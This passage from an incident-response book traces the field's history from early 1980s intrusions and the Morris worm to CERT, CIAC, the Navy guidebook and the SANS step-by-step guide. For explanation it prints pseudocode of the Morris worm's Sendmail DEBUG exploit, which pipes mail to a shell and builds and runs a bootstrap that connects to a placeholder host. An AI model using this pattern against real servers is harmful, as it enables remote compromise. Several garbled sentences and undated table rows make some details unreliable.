# Chapter 3: History of Incident Response & Major Threats

operate under uncertainty, and resilience to maintain focus when outcomes are not fully within one’s control. An effective response requires collaboration across teams, clear communication under pressure, and a balance between technical precision and strategic thinking. It requires understanding one’s sphere of influence and working effectively with decision makers and other stakeholders. It requires recognizing that no organization, however well-prepared, is immune to incidents, and that what differentiates effective incident response is how responders act.

For those responsible for responding to incidents today, or those who expect to be, this book is a practical companion. The aim is to provide a clear, repeatable approach that improves decision quality when the stakes are high, the information is incomplete, and the clock is ticking in the attacker’s favor.

Let’s get started.

THE NEED FOR INCIDENT RESPONSE

In the opening narrative, Jordan works as a developer at the fictitious NovaRise, developing the NovaFlow product. Like many developers, Jordan spends time integrating third-party code into products, leveraging libraries, packages, frameworks, and Software Development Kits (SDKs) to speed up development and reduce the amount of code to write. This is a common practice in software development and saves organizations significant time and money. It also introduces a new risk: the threat of supply chain interdiction.

Jordan investigates an unexpected process listening on port number 8080. The SDK provided by Gilded Freight has some questionable components, including undocumented listeners and processes, and obfuscated code in the SDK installer script.

To many organizations, this is the beginning of an incident, one that should be investigated, documented, and responded to in a timely manner to prevent further harm to the organization. In Jordan’s case, as in many organizations, there is no formal incident response plan in place, and no clear requirement for Jordan to report the incident to anyone in the organization. Jordan attempts to manage the situation by terminating the concerning processes and removing the SDK from the filesystem. The term incident refers to an adverse event in an information system or network, or the threat of such an event, implying harm or the attempt to harm.

The narrative continues to illustrate the threat actor, Pyrix’s, perspective and the actions taken to gain access to NovaRise systems. Jordan’s actions to remove the SDK from the system are not enough to prevent further harm. Pyrix uses stolen credentials and SSH keys to move laterally through internal development servers, pivot into NovaRise’s AWS environment, and exfiltrate customer shipping data and the proprietary NovaFlow routing algorithm. By the time anyone investigates, Pyrix has accessed systems well beyond Jordan’s workstation, compromising both customer data and the intellectual property that differentiates NovaRise in the market. The case study concludes with an incident response analyst investigating Jordan’s ticket and following a

structured, competent response process. The analyst’s work is thorough for the single workstation As incident responders, we are tasked with preparing organizations to respond to incidents like the one NovaRise faced. We are responsible for developing the plans, procedures, and strategies to respond to incidents. We observe, orient, detect, and act by applying triage, verification, scoping, containment, eradication, and recovery processes. We continually improve our processes by reviewing actions taken before and during incidents, using metrics to assess our effectiveness, and applying lessons learned to enhance our response in the future.

THE PURPOSE OF THIS BOOK This book is not intended to be a comprehensive guide to the tools used to collect and analyze evidence during an incident. There are several excellent books that cover this topic in great detail. [1] Nor is it intended to be a treatise on the elements of incident management, or the high-level strategic planning required to build an incident response program. Instead, this book provides insights into incident response and the strategies responders can adopt to meaningfully reduce the impact of incidents on their organization. Intended for technical analysts and incident responders, this book provides a clear path to understanding the incident response process. It

covers how to minimize mistakes, improve the effectiveness of the response effort, leverage information resources to inform decision-making, and prepare organizations to respond to changing attacker Tactics, Techniques, and Procedures (TTPs). CHANGING DEMANDS OF THE INCIDENT RESPONSE FUNCTION Over the last few decades, the needs of incident response have changed significantly for organizations. What was once an effort designed to respond to a computer virus or a violation of an acceptable use policy

has evolved into complex, company-wide initiatives designed to limit the impact of cyber threats and maintain compliance with regulatory requirements. The changing demands of the incident response function are driven by several factors, including: • Increased reliance on digital services : The digital transformation of organizations has heightened reliance on digital services, thereby increasing the severity of cyber incidents.

• Increased threat complexity and volume : The number and sophistication of cyber threats have increased significantly in recent years. Organizations need to respond to a wide range of threats, from small-scale malware infections to sophisticated nation-state attacks. • Regulatory requirements : Organizations are subject to a growing number of data protection and privacy regulations, with mandatory breach notification requirements in many jurisdictions and increasingly complex reporting requirements for cyber insurers. • Coordinated intelligence sharing : Organizations are increasingly participating in threat intelligence sharing initiatives to better understand the threats they face and to collaborate with other organizations to defend against them. • Rise of ransomware and extortion threats : Ransomware and extortion threats have become more

prevalent and sophisticated, with attackers targeting organizations of all sizes and industries. • Cloud and third-party risks : Cloud environments and third-party services are integral to business operations, requiring specialized incident response strategies to address misconfigurations, breaches, and shared responsibility models. • Remote work challenges: The shift to remote work for many industries has introduced new challenges

for incident response, including securing remote endpoints, managing remote incident response teams, and responding to incidents in a distributed environment.

• Public and stakeholder expectations : Organizations are under increasing pressure to demonstrate effective incident response capabilities to customers, regulators, and other stakeholders.

• Emphasis on proactive defense : Incident response teams are increasingly focused on tools such as Security Information and Event Management (SIEM), Extended Detection and Response (XDR), and Security Orchestration, Automation, and Response (SOAR) to quickly identify and mitigate the impact of security incidents.

• AI-driven attack orchestration : The rise of AI has enabled attackers to automate and scale their Digital Forensics and Incident Response: Incident response tools and techniques for effective cyber threat response by Gerard Johansen. 3 A Short History of Incident Response When looking at new approaches to incident response, it’s useful to understand the historical context of existing models. This chapter traces the early cybersecurity incidents that revealed the need for coordinated response, then walks through the formal models and guides that emerged from those events. Understanding where these frameworks came from, and the constraints they were designed to address, helps explain both their durability and their limitations as the threat landscape has changed.

EARLY CYBERSECURITY INCIDENTS

In the early days of computing and networking, cybersecurity incidents were relatively rare and often involved individual hackers or small groups exploiting system vulnerabilities. While there were scattered incidents in the 1960s and 1970s, the significant impact of cybersecurity incidents began to receive widespread recognition in the 1980s. Several notable early incidents are summarized in Table 2.

Table 2 | History of Early Cybersecurity Incidents

June 1982 The 414s A group of Milwaukee high school students started their hacking spree that would eventually compromise over 60 computer systems including Los Alamos National Laboratory. The group’s actions received widespread media attention in the U.S.

November
Chaos Computer Club BTX Hack Demonstration
German hackers from the Chaos Computer Club (CCC) demonstrated critical vulnerabilities in the BTX banking system by transferring 134,000 Deutsche Marks to prove the security flaws.

September
Cuckoo’s Egg/KGB Espionage
German hackers began selling U.S. military and government computer data to the KGB, marking one of the first known cyber-espionage operations. The incident was later popularized by Clifford Stoll’s book The Cuckoo’s Egg.

November
Max Headroom Signal Intrusion
Unknown hijackers took over WGN-TV and WTTW broadcasts in Chicago, with the perpetrators never caught in one of TV’s most famous unsolved intrusions.

November Morris Worm Cornell graduate student Robert Morris released the first major internet worm, infecting 6,000 computers (estimated to be 10% of the internet at the time).

March 1992 Michelangelo Virus One of the first widely publicized viruses, it was designed to activate every March 6 (Michelangelo’s birthday), overwriting hard drives. The Michelangelo virus led to a wave of media coverage and public concern for computer security.

December
Mitnick/Shimomura Incident
Kevin Mitnick hacked Sun Microsystems cybersecurity expert Tsutomu Shimomura’s computer on Christmas Day, leading to a pursuit that ended with Mitnick’s arrest in February 1995.

March 1998 Moonlight Maze Long-running cyber-espionage campaign targeting U.S. military and government networks discovered, suspected to originate from Russia and lasting until at least 2000.

March 1999 Melissa Virus David L. Smith released the fast-spreading email virus that infected millions of computers and caused $80 million in damages.

Of these incidents, the Morris Worm is often cited as a catalyst for the development of formal incident response processes. Cornell graduate student Robert Tappan Morris released the Morris worm from the MIT campus on November 2, 1988. What began as an experiment became the first major internet crisis, infecting approximately 6,000 computers (about 10% of the entire internet at the time). The worm exploited vulnerabilities in UNIX systems, specifically targeting a remote code execution vulnerability in the Sendmail process, a buffer overflow vulnerability in the Finger service, and weak passwords over the Remote Shell (RSH) service. Morris claimed he never intended the widespread damage that occurred. A programming error caused the worm to replicate far more aggressively than intended, reinfecting the same machines repeatedly until they became unusable.

Figure 7 | Morris Worm Propagation

Listing 24 | Pseudocode of Morris Worm Sendmail DEBUG Exploit

FUNCTION exploit_sendmail_debug(target):
socket = connect(target, port=25)
// Enable the DEBUG backdoor
send(socket, "debug")
// Recipient field becomes a shell pipeline
send(socket, "mail from:</dev/null>")
send(socket, 'rcpt to: <"| /bin/sh">')
// Message body is a shell script; sed strips the mail headers
send(socket, "data")
send(socket, "cd /usr/tmp")
send(socket, "cat > hook.c <<'EOF'")
send(socket, <worm bootstrap C source>)
send(socket, "EOF")
send(socket, "cc -o hook hook.c")
send(socket, "./hook <LHOST> <LPORT> <key>")
send(socket, "rm -f hook hook.c")
send(socket, ".")
send(socket, "quit")
The estimated cleanup costs following the Morris worm were estimated to be $200 to

$53,000 per infected machine ($558 to $148,000 in 2026 dollars), as documented in the subsequent appeals court ruling, United States v. Morris, 928 F.2d 504 (2d Cir. 1991). Robert Morris was convicted under the Computer Fraud and Abuse Act (CFAA) in 1990, of $10,050. A timeline of these notable incidents is shown in Figure 8.

Figure 8 | Timeline of Early Cybersecurity Incidents

DEVELOPMENT OF INCIDENT RESPONSE MODELS

Perhaps more interesting than the Morris worm itself is the aftermath of the incident. While cybersecurity

incidents were known before this point, the Morris worm was the first to gain widespread media attention and public awareness. The incident highlighted the vulnerabilities of interconnected systems and the potential for widespread disruption, prompting the formation of organizations focused on responding to cybersecurity incidents. CERT and CIAC

The Defense Advanced Research Projects Agency (DARPA) formed the first Computer Emergency Response

Team (CERT) at Carnegie Mellon University (CMU) on November 17, 1988, just two weeks after the Morris worm. DARPA, which had funded the ARPANET that evolved into the internet, recognized that the Morris worm exposed a critical gap in internet infrastructure: there was no coordinated mechanism for responding to network-wide security emergencies. During the Morris worm crisis, system administrators lacked any centralized resource to coordinate response efforts or distribute patches, exacerbating the disruption. For the first time, DARPA allocated funding to create CERT at CMU’s Software Engineering Institute (SEI), choosing CMU both for its technical expertise and because it had been one of the institutions hit hard by the worm. CERT’s mission was visionary for its time: to serve as a central point of contact for internet security

emergencies, coordinate responses to attacks, and disseminate vulnerability information to prevent future incidents. The CERT team developed the first vulnerability disclosure processes, created security advisory systems, and established secure communication channels for discussing sensitive security issues. While CERT became the public face of coordinated incident response, the US Department of Energy (DOE)

established its own Computer Incident Advisory Capability (CIAC) in 1989, following CERT’s pioneering model but adapting it for more specialized needs. CIAC was formed at Lawrence Livermore National Laboratory (LLNL) specifically to protect DOE’s critical computing infrastructure, which included nuclear weapons research facilities, national laboratories, and energy grid systems. Unlike CERT’s mandate to serve the entire internet community, CIAC focused on the unique security challenges of protecting United States classified research and critical infrastructure. Founded by Dr. E. Eugene Schultz Jr., CIAC would fundamentally shape how organizations respond to

security incidents. On July 23, 1990, Schultz and his colleagues at LLNL published Responding to Computer Security Incidents: Guidelines for Incident Handling , establishing the first formal methodology for incident response. [1] Using a systematic approach, the landmark paper drew on CIAC’s real-world experiences

handling incidents at DOE facilities to create a structured framework for responding to cybersecurity crises. The paper outlined priorities for incident handling: protecting human life and safety; protecting classified and sensitive data; protecting other data; preventing damage to systems; and minimizing disruption to computing resources. It also defined six important stages of incident response. “There are at least six identifiable stages of response to a computer security incident. Knowing about each

stage can help you respond more methodically (and thus more efficiently) and develop a more complete contingency response plan for your organization. (Schultz et al., p. 7) Schultz’s framework provided structure to the developing cybersecurity incident response specialty that

had otherwise been operating on instinct and improvisation. By documenting CIAC’s real-world experiences and distilling them into reproducible processes, this work transformed incident response from an art practiced by a few experts into a discipline that organizations worldwide could implement. The guidelines developed at CIAC served as the foundation for virtually every incident response plan that followed, establishing principles that remain central to cybersecurity operations more than three decades later. Later Developments: US Navy, SANS, and NIST

In 1996, the US Navy Staff Office published Computer Incident Response Guidebook P-5239-19 . Building on

Schultz’s earlier work, the Navy guidebook expanded the framework with detailed procedures and best practices for military contexts. Although intended for the Department of the Navy, P-5239-19 became influential across government agencies and private-sector companies, and served as the direct basis for the SANS Institute’s Computer Security Incident Handling Step-by-Step Guide. The SANS Institute (SANS), founded in 1989, is a cooperative research and education organization focused

on information security training and certification. In the late 1990s, when SANS founder Alan Paller turned the organization’s attention to incident response, cybersecurity was not yet a profession with full-time roles at most organizations. Intrusions, malware outbreaks, and abuse cases were handled by system administrators, network engineers, and IT generalists who picked up security work alongside their primary duties. Schultz’s 1990 framework and the Navy’s 1996 guidebook had established the conceptual foundations of incident handling, but neither had been distilled into a format a generalist could open and apply during an actual incident. Stephen Northcutt, then at the Naval Surface Warfare Center and serving as Director of the SANS Incident

Handling Research Program, led the development of a guide to close that gap. First published as version 1.5 in May 1998, Computer Security Incident Handling: Step-by-Step drew on the experience of incident handlers from more than fifty organizations across commercial, government, and educational sectors, including the Australian Computer Emergency Response Team (AusCERT) and CIAC. The guide organized incident response into six steps (preparation, identification, containment, eradication, recovery, and follow-up), with each step broken into numbered steps and each step into discrete actions. Each step opened with a Problem statement naming the failure mode it was designed to prevent, followed by specific actions a responder could take to address it. An Emergency Action Card provided a one-page reference of ten actions for practitioners caught unprepared, and later sections covered specific incident types (malicious code, denial of service, espionage, hoaxes, and unauthorized access) along with reusable forms for incident record-keeping. Figure 9 shows an early draft of the guide’s title page, held by Randy Marchany, one of the original authors. Figure 9 | Randy Marchany with an Early Draft of the SANS Step-By-Step Guide (PC: Sahil Dudani)

Figure 10 | SANS Computer Incident Handling Step-by-Step Guide, Version 1.5 (1998)

The SANS guide’s contribution was less in the innovation of the underlying model than in how it was

packaged: expert-vetted content delivered in a format a generalist could read and apply under pressure.
